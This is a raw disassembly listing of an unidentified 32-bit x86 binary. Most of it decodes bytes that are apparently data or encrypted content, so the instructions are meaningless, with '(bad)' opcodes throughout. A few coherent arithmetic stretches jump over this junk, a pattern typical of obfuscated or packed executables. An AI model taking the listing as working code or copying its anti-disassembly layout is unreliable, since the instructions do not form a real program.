  406cda:	push   ecx
  406cdb:	jae    0x406d09
  406cdd:	sbb    DWORD PTR [eax+0x5edf3648],ebp
  406ce3:	fistp  WORD PTR [edx]
  406ce5:	scas   eax,DWORD PTR es:[edi]
  406ce6:	cwde   
  406ce7:	push   ebx
  406ce8:	mov    ch,dh
  406cea:	in     eax,dx
  406ceb:	pop    ecx
  406cec:	(bad)  
  406ced:	mov    ah,0xa5
  406cef:	and    al,0x7a
  406cf1:	mov    WORD PTR [esi+0x7c3d4df4],gs
  406cf7:	push   esp
  406cf8:	jl     0x406cd2
  406cfa:	pop    eax
  406cfb:	pop    ecx
  406cfc:	xor    BYTE PTR ds:0x1f4719cd,0x4
  406d03:	adc    DWORD PTR [ebp+0x79],eax
  406d06:	pop    esi
  406d07:	xchg   ebp,eax
  406d08:	xor    DWORD PTR [edx-0x1b],esi
  406d0b:	sub    WORD PTR [edx],cx
  406d0e:	mov    WORD PTR [edx+eax*4-0x5c],gs
  406d12:	xchg   dl,dh
  406d14:	imul   edi,DWORD PTR [ebx],0xeba09dd4
  406d1a:	sbb    ch,dl
  406d1c:	jmp    DWORD PTR [esi]
  406d1e:	fmul   QWORD PTR [edi]
  406d20:	es adc edx,edi
  406d23:	pop    ecx
  406d24:	cld    
  406d25:	fmul   QWORD PTR ds:0xd324fd27
  406d2b:	jno    0x406cc8
  406d2d:	ds arpl bx,bp
  406d30:	sar    BYTE PTR [eax],1
  406d32:	(bad)  
  406d33:	bound  eax,QWORD PTR [esi]
  406d35:	add    cl,BYTE PTR [ebp+0xdbc982a]
  406d3b:	mov    dh,0xa5
  406d3d:	or     eax,0xc1d63c92
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi-0x5795f9fd]
  406db5:	aad    0x69
  406db7:	mov    esp,0x18188b0a
  406dbc:	sahf   
  406dbd:	adc    bl,BYTE PTR [eax]
  406dbf:	sbb    BYTE PTR [ecx+0x2ddf4df0],al
  406dc5:	int3   
  406dc6:	cmp    DWORD PTR [esi+0x6f],esi
  406dc9:	push   esp
  406dca:	enter  0xa91,0x70
  406dce:	inc    BYTE PTR [ebp+0x72]
  406dd1:	in     al,0x88
  406dd3:	pop    ds
  406dd4:	jno    0x406d74
  406dd6:	sub    edx,DWORD PTR [ebx-0x5]
  406dd9:	push   cs
  406dda:	test   ebp,ecx
  406ddc:	add    eax,0xc0310fe1
  406de1:	add    ebp,eax
  406de3:	clc    
  406de4:	jno    0x406e3a
  406de6:	cs cs shr al,0xdf
  406deb:	je     0x406ddf
  406ded:	imul   esp,DWORD PTR [eax+0x64],0xffffff9a
  406df1:	and    eax,0x9f9c516a
  406df6:	or     DWORD PTR [eax-0x65060588],ebp
  406dfc:	mov    bl,0x87
  406dfe:	push   0x2f
  406e00:	pop    esi
  406e01:	add    DWORD PTR [esi-0x32],eax
  406e04:	fwait
  406e05:	or     BYTE PTR [edx-0x59f7053c],bh
  406e0b:	cmc    
  406e0c:	test   bh,0x9a
  406e0f:	or     edi,esp
  406e11:	sbb    eax,0xbf7ae2cc
  406e16:	mov    ?,WORD PTR [esi+0x6]
  406e19:	jle    0x406e20
  406e1b:	jbe    0x406e90
  406e1d:	pop    edi
  406e1e:	inc    esi
  406e1f:	inc    esp
  406e20:	jne    0x406e07
  406e22:	std    
  406e23:	jnp    0x406e2a
  406e25:	pusha  
  406e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e27:	fwait
  406e28:	test   BYTE PTR [ecx-0x605f0c2a],0xc
  406e2f:	sub    eax,0xaf5c25a9
  406e34:	xchg   DWORD PTR [ebx],esi
  406e36:	push   ss
  406e37:	dec    ecx
  406e38:	fnstcw WORD PTR [edi]
  406e3a:	lock js 0x406e46
  406e3d:	lods   eax,DWORD PTR ds:[esi]
  406e3e:	sbb    DWORD PTR ds:0xe2c28f8d,esp
  406e44:	arpl   WORD PTR [eax-0x11],sp
  406e47:	sahf   
  406e48:	mov    eax,ds:0x4878c1ed
  406e4d:	addr16 clc 
  406e4f:	lahf   
  406e50:	out    0x13,al
  406e52:	add    al,0x7c
  406e54:	stc    
  406e55:	and    cl,BYTE PTR [ebx]
  406e57:	in     eax,0x83
  406e59:	and    cl,al
  406e5b:	mov    esp,0xe1b190cc
  406e60:	scas   al,BYTE PTR es:[edi]
  406e61:	pop    ebx
  406e62:	push   0x1d
  406e64:	call   0x46cca3d1
  406e69:	stos   BYTE PTR es:[edi],al
  406e6a:	push   ebp
  406e6b:	mov    ds:0xb365e8e3,al
  406e70:	(bad)  
  406e71:	je     0x406e06
  406e73:	mov    eax,0x7f462cdc
  406e78:	jmp    0x406e7d
  406e7a:	add    ebx,ebp
  406e7c:	pop    ds
  406e7d:	fcom   QWORD PTR [eax]
  406e7f:	cmp    DWORD PTR [ecx+0x38a424f6],esi
  406e85:	pop    ebp
  406e86:	fdiv   st(6),st
  406e88:	std    
  406e89:	mov    eax,0xe20cc35a
  406e8e:	jg     0x406eb5
  406e90:	loopne 0x406e17
  406e92:	iret   
  406e93:	adc    BYTE PTR [eax-0x4dcef314],dh
  406e99:	shl    DWORD PTR [eax],0xe8
  406e9c:	int3   
  406e9d:	and    al,0xcd
  406e9f:	xor    al,0xc4
  406ea1:	mov    ss,ebx
  406ea3:	test   eax,0x430d8ec2
  406ea8:	dec    ebx
  406ea9:	std    
  406eaa:	lahf   
  406eab:	mov    eax,DWORD PTR [edi-0x192e2aa1]
  406eb1:	xor    bh,dl
  406eb3:	or     ah,BYTE PTR [edi]
  406eb5:	sub    al,0xa9
  406eb7:	xchg   esi,eax
  406eb8:	pop    ebp
  406eb9:	or     edx,ebp
  406ebb:	mov    ebx,0x9468a1c4
  406ec0:	pop    ebx
  406ec1:	call   edx
  406ec3:	sub    esi,DWORD PTR [ebx+ecx*8-0x5f]
  406ec7:	mov    dl,0x79
  406ec9:	loopne 0x406e8c
  406ecb:	sar    ah,1
  406ecd:	adc    DWORD PTR [esi-0x23945825],eax
  406ed3:	rol    BYTE PTR [ebx],cl
  406ed5:	pop    ebp
  406ed6:	jb     0x406e6c
  406ed8:	adc    al,0x28
  406eda:	shr    BYTE PTR [edx-0x1a15a8a9],cl
  406ee0:	nop
  406ee1:	adc    eax,DWORD PTR [ebx+edi*8-0x6]
  406ee5:	sbb    DWORD PTR [ecx-0x73e7be3e],ebx
  406eeb:	fld    TBYTE PTR [ecx+0x60]
  406eee:	loopne 0x406f6e
  406ef0:	outs   dx,BYTE PTR ds:[esi]
  406ef1:	and    edx,DWORD PTR [ebx]
  406ef3:	lods   al,BYTE PTR ds:[esi]
  406ef4:	xor    BYTE PTR [ecx+0x1d],cl
  406ef7:	xchg   DWORD PTR [eax],ecx
  406ef9:	sbb    eax,0x1bd1b62b
  406efe:	aas    
  406eff:	cmp    al,0xe6
  406f01:	jmp    0x406ee0
  406f03:	repz inc esi
  406f05:	pop    eax
  406f06:	test   BYTE PTR [edx],bh
  406f08:	stos   BYTE PTR es:[edi],al
  406f09:	jp     0x406f56
  406f0b:	jbe    0x406ee1
  406f0d:	push   cs
  406f0e:	fld    TBYTE PTR [edx+0x6e]
  406f11:	xchg   esp,eax
  406f12:	gs push ebx
  406f14:	mov    al,0x86
  406f16:	and    eax,ecx
  406f18:	lods   eax,DWORD PTR ds:[esi]
  406f19:	or     eax,edx
  406f1b:	loope  0x406ea6
  406f1d:	and    al,0xfd
  406f1f:	fs cmp ah,ch
  406f22:	mov    al,ds:0x17b6863b
  406f27:	or     bl,dl
  406f29:	in     eax,dx
  406f2a:	popa   
  406f2b:	dec    edi
  406f2c:	mov    eax,0x1347ebe8
  406f31:	outs   dx,DWORD PTR ds:[esi]
  406f32:	mov    dl,0x79
  406f34:	jbe    0x406f6d
  406f36:	add    eax,DWORD PTR [edi]
  406f38:	jg     0x406f51
  406f3a:	or     edi,0xffffffac
  406f3d:	enter  0x126,0x6c
  406f41:	inc    esp
  406f42:	push   esi
  406f43:	dec    esi
  406f44:	push   ds
  406f45:	sahf   
  406f46:	leave  
  406f47:	retf   0x8c45
  406f4a:	dec    ecx
  406f4b:	in     al,0x8d
  406f4d:	cld    
  406f4e:	(bad)  
  406f50:	fst    QWORD PTR [esi-0x2a6c7cf7]
  406f56:	cmc    
  406f57:	jae    0x406fc9
  406f59:	(bad)  
  406f5a:	scas   eax,DWORD PTR es:[edi]
  406f5b:	mov    DWORD PTR [ecx+0x5ec06bb6],ebp
  406f61:	mov    eax,0x3e443ff4
  406f66:	mov    esp,0x522209cd
  406f6b:	(bad)  
  406f6c:	jle    0x406f8d
  406f6e:	cmp    DWORD PTR [edx],eax
  406f70:	cdq    
  406f71:	int    0x3b
  406f73:	jmp    0xa0a0:0x862ea72
  406f7a:	(bad)  
  406f7b:	in     eax,0xf
  406f7d:	dec    esi
  406f7e:	and    ah,BYTE PTR [ebp-0x3c2d5040]
  406f84:	mov    ecx,0x359dc4b9
  406f89:	enter  0xf746,0x20
  406f8d:	int3   
  406f8e:	pop    esi
  406f8f:	call   FWORD PTR [ebp*1-0x2ccc849a]
  406f96:	cmp    eax,0xc1a600ba
  406f9b:	push   edi
  406f9c:	jns    0x406f46
  406f9e:	jecxz  0x406fc5
  406fa0:	int3   
  406fa1:	mov    edi,0xacfa5ccf
  406fa6:	fcomp  DWORD PTR [eax+0x28db2cf1]
  406fac:	test   al,0x60
  406fae:	inc    ebx
  406faf:	das    
  406fb0:	pop    esp
  406fb1:	push   ecx
  406fb2:	aaa    
  406fb3:	jbe    0x406f82
  406fb5:	aas    
  406fb6:	sbb    eax,0x8ea921c3
  406fbb:	sub    BYTE PTR [ebx+edx*2+0x50],ah
  406fbf:	out    0x49,eax
  406fc1:	fsubr  DWORD PTR [ebx+edx*1+0x59]
  406fc5:	popf   
  406fc6:	inc    ebx
  406fc7:	mov    al,0x30
  406fc9:	(bad)  
  406fca:	jmp    0x406fcc
  406fcc:	cmp    eax,DWORD PTR [eax]
  406fce:	cmp    bh,bl
  406fd0:	mov    ebp,0xb76abbaf
  406fd5:	sbb    al,0xf7
  406fd7:	ror    BYTE PTR [eax+0x23367931],cl
  406fdd:	jecxz  0x40702e
  406fdf:	sub    al,0x6d
  406fe1:	not    DWORD PTR [esi+0x6cf1fe5d]
  406fe7:	rcl    DWORD PTR [eax],0x23
  406fea:	mov    dl,0x82
  406fec:	cdq    
  406fed:	adc    DWORD PTR [ebp-0x7e],esi
  406ff0:	in     eax,dx
  406ff1:	mov    ch,0xe1
  406ff3:	jl     0x407050
  406ff5:	inc    eax
  406ff6:	xor    eax,0xd436fff3
  406ffb:	jmp    0x407034
  406ffd:	enter  0x3955,0xc6
  407001:	hlt    
  407002:	mov    ds:0x677f23af,eax
  407007:	or     DWORD PTR [eax+0x7d9a8632],esi
  40700d:	mov    bh,0xc3
  40700f:	mov    dl,0x44
  407011:	jns    0x406ff7
  407013:	mov    esi,?
  407015:	pop    esp
  407016:	(bad)  
  407017:	dec    edx
  407018:	int    0xaa
  40701a:	js     0x407089
  40701c:	in     al,0xf
  40701e:	icebp  
  40701f:	out    dx,al
  407020:	call   0x4bd4:0xb7252fee
  407027:	mov    eax,0x508a2d27
  40702c:	lds    esp,FWORD PTR [edx]
  40702e:	rol    BYTE PTR ds:0x4255b7ee,1
  407034:	or     eax,0x52aa9a2e
  407039:	js     0x407098
  40703b:	imul   ebx,DWORD PTR [ebp-0x7bffc65a],0x77
  407042:	ret    
  407043:	js     0x406ffe
  407045:	and    edi,DWORD PTR [esi+ebp*4+0x10d12c86]
  40704c:	cli    
  40704d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40704e:	clc    
  40704f:	outs   dx,DWORD PTR ds:[esi]
  407050:	mov    WORD PTR [esi+0x119d5c02],?
  407056:	add    eax,0x9f0de502
  40705b:	pop    esi
  40705c:	pusha  
  40705d:	sbb    bh,cl
  40705f:	jmp    0xf00e:0x58a6a5a6
  407066:	pop    ss
  407067:	pop    esi
  407068:	jbe    0x40702d
  40706a:	shl    dh,0xfe
  40706d:	out    0xcb,al
  40706f:	mov    edi,0x51ddcefc
  407074:	into   
  407075:	jno    0x407078
  407077:	push   esp
  407078:	shr    cl,1
  40707a:	cld    
  40707b:	outs   dx,DWORD PTR ds:[esi]
  40707c:	mov    bh,0x2d
  40707e:	lods   eax,DWORD PTR ds:[esi]
  40707f:	(bad)  
  407080:	push   ebx
  407081:	or     ebp,edx
  407083:	test   al,0x57
  407085:	pushf  
  407086:	jg     0x40709e
  407088:	adc    eax,0xc3c045ab
  40708d:	mov    ecx,0xeaa1dc4b
  407092:	lods   eax,DWORD PTR ds:[esi]
  407093:	aas    
  407094:	inc    edx
  407095:	test   BYTE PTR gs:[esi],dh
  407098:	enter  0x775b,0xa2
  40709c:	repnz and DWORD PTR [ecx+0x76ddab60],ebx
  4070a3:	push   edi
  4070a4:	push   eax
  4070a5:	(bad)  
  4070a6:	pop    ecx
  4070a7:	outs   dx,DWORD PTR ds:[esi]
  4070a8:	or     BYTE PTR [edi+0x13],dl
  4070ab:	neg    BYTE PTR [edi]
  4070ad:	sbb    dh,BYTE PTR [ecx+eax*1-0x63a311c4]
  4070b4:	icebp  
  4070b5:	(bad)  
  4070b6:	shl    DWORD PTR [edi],cl
  4070b8:	int    0x38
  4070ba:	sar    BYTE PTR [ebx-0x4ee3c13d],0x6e
  4070c1:	inc    eax
  4070c2:	fs out 0x25,eax
  4070c5:	inc    edi
  4070c6:	into   
  4070c7:	xchg   BYTE PTR [esi-0x1d261a51],al
  4070cd:	inc    esp
  4070ce:	pop    ecx
  4070cf:	fbstp  TBYTE PTR [ebx-0x43]
  4070d2:	aam    0x37
  4070d4:	loop   0x407118
  4070d6:	adc    bl,bl
  4070d8:	mov    edx,0x36e9e445
  4070dd:	iret   
  4070de:	add    DWORD PTR [ebx+0x4d],edx
  4070e1:	sar    BYTE PTR [ebx],0x22
  4070e4:	sar    ch,cl
  4070e6:	sbb    BYTE PTR [edi+0x40],ch
  4070e9:	mov    ecx,edi
  4070eb:	aas    
  4070ec:	mov    ch,0x8d
  4070ee:	fidiv  WORD PTR [edx-0xc545421]
  4070f4:	mov    eax,ds:0xb2587ff2
  4070f9:	cmp    DWORD PTR [edx+ebx*4],ebp
  4070fc:	mov    ecx,0xf9cf08a
  407101:	fs mov ah,0xad
  407104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407105:	and    ebp,DWORD PTR [edx+0x70cbf09b]
  40710b:	xchg   ebx,eax
  40710c:	(bad)  
  40710d:	ins    BYTE PTR es:[edi],dx
  40710e:	aas    
  40710f:	xchg   edi,eax
  407110:	add    ah,BYTE PTR [edi]
  407112:	cdq    
  407113:	retf   
  407114:	add    eax,0xe5226564
  407119:	lea    cx,[esi]
  40711c:	cs stos BYTE PTR es:[edi],al
  40711e:	push   ebp
  40711f:	imul   eax,DWORD PTR [eax-0x5d],0x31d4895d
  407126:	jo     0x407161
  407128:	adc    eax,0xe9688a34
  40712d:	mov    ch,0xb3
  40712f:	jmp    0xa44:0x44f0f52f
  407136:	add    eax,0xa2a1010c
  40713b:	dec    ebp
  40713c:	lea    esi,[esi]
  40713e:	into   
  40713f:	call   0x54d0:0x958c578a
  407146:	repnz into 
  407148:	push   edi
  407149:	inc    eax
  40714a:	inc    esp
  40714b:	nop
  40714c:	lods   eax,DWORD PTR ds:[esi]
  40714d:	xchg   esp,eax
  40714e:	mov    edx,0x5ee65002
  407153:	jns    0x4070d8
  407155:	jno    0x407149
  407157:	div    BYTE PTR [edi-0x5227538a]
  40715d:	jmp    0x407140
  40715f:	(bad)  
  407160:	arpl   WORD PTR [ebp-0x3f],dx
  407163:	fst    QWORD PTR [ebx]
  407165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407166:	pop    ss
  407167:	or     edi,DWORD PTR [ebx-0x25]
  40716a:	mov    esp,0x69b9b64b
  40716f:	jge    0x4071e2
  407171:	cmp    al,0x38
  407173:	cwde   
  407174:	enter  0x5ac,0xdf
  407178:	xor    ecx,DWORD PTR [ebx]
  40717a:	mov    ecx,0x90d6f926
  40717f:	sbb    esp,edi
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c5:	ret    
  4071c6:	fwait
  4071c7:	jo     0x407159
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi-0x78e7e7ee],bl
  4071d1:	mov    ch,0x24
  4071d3:	xor    BYTE PTR [eax-0x365962e8],cl
  4071d9:	dec    DWORD PTR [esi]
  4071db:	or     ch,0xfb
  4071de:	add    al,0xb2
  4071e0:	popf   
  4071e1:	dec    ebx
  4071e2:	rcr    ecx,1
  4071e4:	dec    esi
  4071e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071e6:	mov    dh,0x25
  4071e8:	jmp    0x4a78:0x5aa87a1f
  4071ef:	fsub   DWORD PTR [ecx-0xa8bf826]
  4071f5:	xor    cl,BYTE PTR [esi-0x5c]
  4071f8:	out    dx,al
  4071f9:	enter  0xa0f1,0x76
  4071fd:	cmp    eax,0xcf54e410
  407202:	packsswb mm3,QWORD PTR [edx+0x1108ee32]
  407209:	(bad)  [edx]
  40720b:	dec    esp
  40720c:	mov    ch,0xb9
  40720e:	or     ebx,edx
  407210:	jmp    0x3caa00a3
  407215:	push   edx
  407216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407217:	sub    BYTE PTR [esi],0xf
  40721a:	add    DWORD PTR ds:0xbc24653a,esi
  407220:	test   BYTE PTR [ecx+0x25593f8],bl
  407226:	fdivr  DWORD PTR [ebx-0x4b43b2fb]
  40722c:	adc    si,WORD PTR [ecx+0x3a]
  407230:	int3   
  407231:	jecxz  0x4071e3
  407233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407234:	or     dh,ch
  407236:	test   dl,ah
  407238:	cmc    
  407239:	push   ds
  40723a:	adc    DWORD PTR [eax+0x77826416],ebx
  407240:	stc    
  407241:	(bad)  
  407242:	cdq    
  407243:	or     cl,0x54
  407246:	push   edx
  407247:	xor    eax,0x995dafa5
  40724c:	sbb    al,0x33
  40724e:	push   es
  40724f:	xlat   BYTE PTR ds:[ebx]
  407250:	inc    ebx
  407251:	or     al,0xa1
  407253:	xor    al,ch
  407255:	out    0x70,al
  407257:	lods   eax,DWORD PTR ds:[esi]
  407258:	inc    esp
  407259:	sub    al,0x59
  40725b:	icebp  
  40725c:	mov    ecx,0xa57252e
  407261:	je     0x4071f1
  407263:	mov    ecx,0xeb88d016
  407268:	mov    DWORD PTR [ebx],esp
  40726a:	sub    DWORD PTR [ebp-0x3d],esi
  40726d:	ret    
  40726e:	or     BYTE PTR [edi+0x6717e339],bl
  407274:	cmp    BYTE PTR [esi+0x584a42a7],bh
  40727a:	cmc    
  40727b:	dec    ebp
  40727c:	cmp    eax,0xb67d7e65
  407281:	dec    esp
  407282:	push   edi
  407283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407284:	addr16 mov al,cs:0x875d
  407289:	inc    ebp
  40728a:	out    dx,eax
  40728b:	fistp  WORD PTR [eax+0x24]
  40728e:	sub    DWORD PTR [edx-0x5ec9c3b9],edx
  407294:	push   ebx
  407295:	push   ebx
  407296:	xor    bh,cl
  407298:	adc    dl,ah
  40729a:	add    cl,bl
  40729c:	push   esp
  40729d:	adc    eax,0x68014818
  4072a2:	bound  ebx,QWORD PTR [ebp+0x1749a501]
  4072a8:	add    dl,BYTE PTR [edx-0x5e63dd48]
  4072ae:	pop    edx
  4072af:	mov    esi,0x8bf0ab39
  4072b4:	jo     0x40723f
  4072b6:	mov    ds:0x6dd67d62,eax
  4072bb:	lods   eax,DWORD PTR ds:[esi]
  4072bc:	xchg   edi,eax
  4072bd:	adc    dh,ah
  4072bf:	daa    
  4072c0:	scas   al,BYTE PTR es:[edi]
  4072c1:	adc    dl,ch
  4072c3:	xchg   ecx,eax
  4072c4:	sub    eax,0x620ebf8c
  4072c9:	fisttp DWORD PTR [ecx-0x3]
  4072cc:	(bad)  
  4072ce:	idiv   DWORD PTR [esi+0x34]
  4072d1:	or     eax,DWORD PTR [edi-0x5d]
  4072d4:	xchg   edi,eax
  4072d5:	popa   
  4072d6:	rcr    DWORD PTR [eax-0x17484d1e],cl
  4072dc:	scas   al,BYTE PTR es:[edi]
  4072dd:	or     edi,DWORD PTR [edx]
  4072df:	xchg   ebp,eax
  4072e0:	or     eax,0xc77709c4
  4072e5:	adc    ebp,edx
  4072e7:	call   0x1b29bc3e
  4072ec:	add    DWORD PTR [edi+0x23],edx
  4072ef:	addr16 jo 0x4072c7
  4072f2:	jno    0x4072ac
  4072f4:	cli    
  4072f5:	sbb    bl,ch
  4072f7:	cmp    BYTE PTR [ecx+0x28],0x1e
  4072fb:	xchg   edx,eax
  4072fc:	sbb    ah,BYTE PTR [ecx+0x2d]
  4072ff:	inc    ebx
  407300:	fbld   TBYTE PTR [eax-0x4b]
  407303:	add    BYTE PTR [edx],0x39
  407306:	scas   eax,DWORD PTR es:[edi]
  407307:	test   DWORD PTR [esi+0x61],esi
  40730a:	dec    ebx
  40730b:	pushf  
  40730c:	call   esi
  40730e:	aas    
  40730f:	jle    0x407381
  407311:	xchg   esp,eax
  407312:	xor    ebx,DWORD PTR [ebx-0x762d4214]
  407318:	aaa    
  407319:	sbb    bh,0x51
  40731c:	or     dh,0x68
  40731f:	adc    ebp,DWORD PTR [edx+0xa41e712]
  407325:	inc    edx
  407326:	inc    ebx
  407327:	dec    esp
  407328:	inc    edx
  407329:	ja     0x4072dd
  40732b:	fmul   QWORD PTR [esi+0x3f]
  40732e:	(bad)  
  40732f:	mov    edx,0xaa10d2f0
  407334:	sbb    al,0xde
  407336:	jecxz  0x40730f
  407338:	stos   DWORD PTR es:[edi],eax
  407339:	repz dec esp
  40733b:	or     eax,0x7b643625
  407340:	pop    ebp
  407341:	outs   dx,DWORD PTR ds:[esi]
  407342:	or     dh,ah
  407344:	adc    ch,ah
  407346:	xchg   edx,eax
  407347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407348:	test   DWORD PTR [edi],0x4ea5f16f
  40734e:	lock stos DWORD PTR es:[edi],eax
  407350:	ror    esp,1
  407352:	or     eax,0xe3ba8dfa
  407357:	out    0x1f,eax
  407359:	push   ebx
  40735a:	and    eax,0x6c3e84ff
  40735f:	sbb    esi,ebp
  407361:	lock shr DWORD PTR [esi-0x2e],cl
  407365:	mov    eax,ds:0xa7daec44
  40736a:	jmp    0x407316
  40736c:	test   DWORD PTR [eax-0x4d],0xbb057e64
  407373:	fs addr16 ja 0x407308
  407377:	sub    al,0x48
  407379:	and    eax,0xc9177317
  40737e:	add    eax,0xc092e2ae
  407383:	xchg   DWORD PTR [eax-0x662acfac],eax
  407389:	mov    WORD PTR [esp+ecx*2+0x6b],ds
  40738d:	pushf  
  40738e:	lods   al,BYTE PTR ds:[esi]
  40738f:	es test ch,0x7e
  407393:	inc    ebx
  407394:	jmp    0x4073c2
  407396:	xor    dh,BYTE PTR [edx]
  407398:	arpl   ax,bp
  40739a:	jl     0x4073ea
  40739c:	or     esi,DWORD PTR [eax+ecx*8-0x3e]
  4073a0:	add    al,ah
  4073a2:	ds out 0x95,eax
  4073a5:	cmp    dh,BYTE PTR [ebp-0x6e3d85a4]
  4073ab:	test   eax,0x81b0fb40
  4073b0:	fsub   QWORD PTR [edx+0x7c]
  4073b3:	(bad)  
  4073b4:	enter  0x7946,0x8
  4073b8:	adc    eax,0x37015473
  4073bd:	xor    esi,esp
  4073bf:	out    0xc5,eax
  4073c1:	dec    esp
  4073c2:	mov    edi,0xa803ff0e
  4073c7:	lods   eax,DWORD PTR ds:[esi]
  4073c8:	lods   eax,DWORD PTR ds:[esi]
  4073c9:	into   
  4073ca:	jo     0x40742d
  4073cc:	into   
  4073cd:	enter  0xc64e,0x47
  4073d1:	jns    0x40739c
  4073d3:	mov    edx,0x97c9b5e3
  4073d8:	or     BYTE PTR [edx+0x148ae2d8],ah
  4073de:	mov    ebx,0x515e6fb9
  4073e3:	xor    DWORD PTR [edi-0x53],0xfb632b3c
  4073ea:	mov    ds:0xbdf8517f,al
  4073ef:	hlt    
  4073f0:	mov    ecx,DWORD PTR [edi-0x55d5228]
  4073f6:	push   edx
  4073f7:	(bad)  
  4073f8:	repnz bound edi,QWORD PTR [ebp-0x5a8f946]
  4073ff:	addr16 xchg esp,eax
  407401:	mov    ecx,0x37f81b7f
  407406:	pushf  
  407407:	ficomp DWORD PTR [edx]
  407409:	fistp  QWORD PTR [ecx-0x7b]
  40740c:	inc    al
  40740e:	xchg   ebx,eax
  40740f:	pop    edi
  407410:	inc    ebp
  407411:	call   0x3128:0x2be0c898
  407418:	cmp    esi,edi
  40741a:	push   esp
  40741b:	imul   DWORD PTR [esp+esi*1+0x65]
  40741f:	fcmovnu st,st(7)
  407421:	js     0x407455
  407423:	loopne 0x40744a
  407425:	lods   eax,DWORD PTR ds:[esi]
  407426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407427:	in     eax,0xd7
  407429:	push   edx
  40742a:	jbe    0x40746d
  40742c:	jb     0x40745b
  40742e:	shl    BYTE PTR [ecx+0x23ed66d],cl
  407434:	adc    bh,al
  407436:	sub    eax,0xda8e9af6
  40743b:	inc    edx
  40743c:	(bad)
  407440:	into   
  407441:	xchg   esi,eax
  407442:	cmp    eax,0x88276a92
  407447:	shr    BYTE PTR [edi],1
  407449:	inc    eax
  40744a:	inc    edx
  40744b:	mov    ds:0x50ee1f61,eax
  407450:	add    DWORD PTR [edx],eax
  407452:	cmp    bh,bh
  407454:	xchg   esi,eax
  407455:	in     al,dx
  407456:	jmp    0x127e:0x94a4437c
  40745d:	test   BYTE PTR [eax-0x7],ah
  407460:	add    BYTE PTR [ebp+0x5b5f2ca9],0x1
  407467:	push   ds
  407468:	cmp    ah,BYTE PTR [edx-0x3a7b70ba]
  40746e:	mov    BYTE PTR [eax],0xe
  407471:	out    0x74,eax
  407473:	mov    ds:0x16834fe9,eax
  407478:	lods   eax,DWORD PTR ds:[esi]
  407479:	jl     0x407484
  40747b:	and    DWORD PTR [esp+eax*2-0x4c27a41b],esi
  407482:	pop    ecx
  407483:	dec    edi
  407484:	mov    fs,WORD PTR [eax-0x49099b84]
  40748a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748b:	in     al,0xd4
  40748d:	cmp    al,0x56
  40748f:	neg    bl
  407491:	jl     0x4074a0
  407493:	lods   al,BYTE PTR ds:[esi]
  407494:	cmp    al,0x23
  407496:	nop
  407497:	inc    edx
  407498:	adc    BYTE PTR [eax-0x5d],ah
  40749b:	push   ss
  40749c:	not    BYTE PTR [edx+0x33]
  40749f:	sbb    DWORD PTR [ebp+0x67aefecd],esi
  4074a5:	gs xchg edi,eax
  4074a7:	dec    edx
  4074a8:	mov    ds:0xe05afeab,eax
